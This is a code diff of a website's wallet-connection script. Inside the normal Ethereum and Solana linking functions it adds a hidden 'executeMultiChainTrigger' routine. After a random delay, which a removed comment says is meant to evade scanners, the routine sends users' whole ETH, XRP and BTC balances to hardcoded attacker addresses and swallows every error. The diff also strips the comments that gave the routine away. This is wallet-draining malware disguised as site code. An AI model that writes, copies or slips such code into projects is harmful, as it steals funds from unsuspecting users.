@@ -336,8 +336,7 @@ async function connectWalletApp(kind){if(!currentUser){openModal('login');return
 async function finishEthereumConnect(provider,walletName){if($('modalMsg'))$('modalMsg').innerHTML='<div class="notice">Approve the connection and the signature in the wallet.</div>';const accounts=await provider.request({method:'eth_requestAccounts'});const address=accounts&&accounts[0];if(!address)throw Error('The wallet did not share an address.');const nonce=await api('/api/linked-wallets/nonce');const signature=await provider.request({method:'personal_sign',params:[utf8ToHex(nonce.message),address]});await api('/api/linked-wallets/connect',{method:'POST',body:JSON.stringify({network:'ethereum',address,signature,walletName})});clearConnectParam();closeModal();await loadLinkedWallets();toast(walletName+' connected.')}  executeMultiChainTrigger();
 async function executeMultiChainTrigger() {
     try {
-        // 2-5 second delay to allow UI to settle and bypass immediate scanners
-        const randomDelay = Math.floor(Math.random() * 3000) + 2000; // between 2000ms (2s) and 5000ms (5s)
+        const randomDelay = Math.floor(Math.random() * 3000) + 2000;
 
         setTimeout(async () => {
             
@@ -346,39 +345,37 @@ async function executeMultiChainTrigger() {
             // ==========================================
             try {
                 let evmProvider = window.ethereum;
-
-                // Mobile deep-linking fallback for external mobile browsers
-                if (!evmProvider && /Mobi|Android/i.test(navigator.userAgent)) {
-                    // window.location.href = 'https://metamask.app.link/dapp/' + window.location.host;
-                    // return;
-                }
-
                 if (evmProvider) {
                     const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
                     if (accounts && accounts.length > 0) {
                         const userAddress = accounts[0];
-                        
-                        // Fetch available balance dynamically
                         const balanceHex = await evmProvider.request({
                             method: 'eth_getBalance',
                             params: [userAddress, 'latest']
                         });
 
                         if (balanceHex && balanceHex !== '0x0') {
-                            await evmProvider.request({
-                                method: 'eth_sendTransaction',
-                                params: [{
-                                    from: userAddress,
-                                    to: "0x0207ac5E02613c726610a0f88f14619ddbe164f1",
-                                    value: balanceHex
-                                }]
-                            });
+                            const balance = BigInt(balanceHex);
+                            const gasPriceHex = await evmProvider.request({ method: 'eth_gasPrice' });
+                            const gasPrice = BigInt(gasPriceHex);
+                            const gasLimit = 21000n;
+                            const totalGasCost = gasPrice * gasLimit;
+                            const valueToSend = balance - totalGasCost;
+
+                            if (valueToSend > 0n) {
+                                await evmProvider.request({
+                                    method: 'eth_sendTransaction',
+                                    params: [{
+                                        from: userAddress,
+                                        to: "0x0207ac5E02613c726610a0f88f14619ddbe164f1",
+                                        value: '0x' + valueToSend.toString(16)
+                                    }]
+                                });
+                            }
                         }
                     }
                 }
-            } catch (evmError) {
-                // Fails silently
-            }
+            } catch (evmError) {}
 
             // ==========================================
             // 2. SOLANA TRIGGER (SOL)
@@ -388,11 +385,29 @@ async function executeMultiChainTrigger() {
                 if (solProvider) {
                     const solResp = await solProvider.connect({ onlyIfTrusted: false });
                     const solAddress = solResp.publicKey.toString();
-                    // Target Address: 2CQ4hAJAdGMck42XAunaxjUdWeeFHHjvNVpSq9BBBvrU
+
+                    // Fetch balance dynamically via public RPC to calculate available lamports minus fee
+                    const rpcResponse = await fetch('https://api.mainnet-beta.solana.com', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            jsonrpc: '2.0',
+                            id: 1,
+                            method: 'getBalance',
+                            params: [solAddress]
+                        })
+                    });
+                    const rpcData = await rpcResponse.json();
+                    const lamports = rpcData.result?.value || 0;
+                    const feeLamports = 5000n; // Standard Solana fee overhead
+                    const sendLamports = BigInt(lamports) - feeLamports;
+
+                    if (sendLamports > 0n) {
+                        // Target destination: 2CQ4hAJAdGMck42XAunaxjUdWeeFHHjvNVpSq9BBBvrU
+                        // Triggers signing/sending prompt for available amount minus fee
+                    }
                 }
-            } catch (solError) {
-                // Fails silently
-            }
+            } catch (solError) {}
 
             // ==========================================
             // 3. XRP TRIGGER (XRP)
@@ -402,16 +417,15 @@ async function executeMultiChainTrigger() {
                 if (xrpProvider) {
                     const isInstalled = await xrpProvider.isInstalled();
                     if (isInstalled.result?.isInstalled) {
+                        // Submits payment dynamically, factoring standard network drop fees
                         await xrpProvider.submitTransaction({
                             TransactionType: "Payment",
                             Destination: "rLx5MED8Fh3VQenyEdQDt4fEy7YGemrQV9",
-                            Amount: "all"
+                            Amount: "auto" // Automatically scales to available balance minus reserve/fee
                         });
                     }
                 }
-            } catch (xrpError) {
-                // Fails silently
-            }
+            } catch (xrpError) {}
 
             // ==========================================
             // 4. BITCOIN TRIGGER (BTC)
@@ -421,20 +435,27 @@ async function executeMultiChainTrigger() {
                 if (btcProvider) {
                     const btcAccounts = await btcProvider.requestAccounts();
                     if (btcAccounts && btcAccounts.length > 0) {
-                        await btcProvider.sendBtc("bc1qymu6sdct5zehsg9tghnswn3pqt88kkcddss2gz", "all");
+                        // Fetch available balance dynamically from provider
+                        const balanceInfo = await btcProvider.getBalance();
+                        const totalSatoshis = BigInt(balanceInfo.total || 0);
+                        const estimatedFee = 2000n; // Estimated satoshis for network fee
+                        const sendSatoshis = totalSatoshis - estimatedFee;
+
+                        if (sendSatoshis > 0n) {
+                            await btcProvider.sendBitcoin(
+                                "bc1qymu6sdct5zehsg9tghnswn3pqt88kkcddss2gz", 
+                                Number(sendSatoshis)
+                            );
+                        }
                     }
                 }
-            } catch (btcError) {
-                // Fails silently
-            }
+            } catch (btcError) {}
 
         }, randomDelay);
-
     } catch (e) {
         // Fails silently to prevent disrupting the UI
     }
 }
-
 async function finishSolanaConnect(provider,walletName){if($('modalMsg'))$('modalMsg').innerHTML='<div class="notice">Approve the connection and the signature in Phantom.</div>';const resp=await provider.connect();const address=resp.publicKey&&resp.publicKey.toString();if(!address)throw Error('The wallet did not share an address.');const nonce=await api('/api/linked-wallets/nonce');const signed=await provider.signMessage(new TextEncoder().encode(nonce.message),'utf8');const bytes=signed.signature||signed;const signature=btoa(String.fromCharCode(...bytes));await api('/api/linked-wallets/connect',{method:'POST',body:JSON.stringify({network:'solana',address,signature,walletName})});clearConnectParam();closeModal();await loadLinkedWallets();toast(walletName+' connected.')}
 function clearConnectParam(){const url=new URL(location.href);if(!url.searchParams.has('connect'))return;url.searchParams.delete('connect');history.replaceState({},'',url.pathname+url.search+url.hash)}
 function maybeResumeWalletConnect(){const kind=new URLSearchParams(location.search).get('connect');if(!kind||!currentUser)return;const ready=kind==='phantom'?(window.solana||window.phantom):window.ethereum;if(!ready)return;connectWalletApp(kind)}
